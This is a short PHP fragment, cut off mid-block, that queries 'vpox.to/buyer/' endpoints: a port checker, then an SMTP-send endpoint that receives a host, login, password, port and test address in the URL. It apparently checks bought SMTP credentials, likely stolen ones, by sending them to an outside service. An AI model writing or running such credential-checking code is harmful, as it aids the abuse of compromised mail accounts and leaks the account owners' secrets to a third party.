...
$socks  = "https://vpox.to/buyer/PortChecker.php?host=$url&port=$port";
$socks2 = curl_get_contents($socks);
if (preg_match('#Success!#', $socks2)) {
    $urltoapi  = "https://vpox.to/buyer/SMTPSend.php?host=$url&login=$login&pass=$pass&port=$port&id=$id&testmail=$testemail";
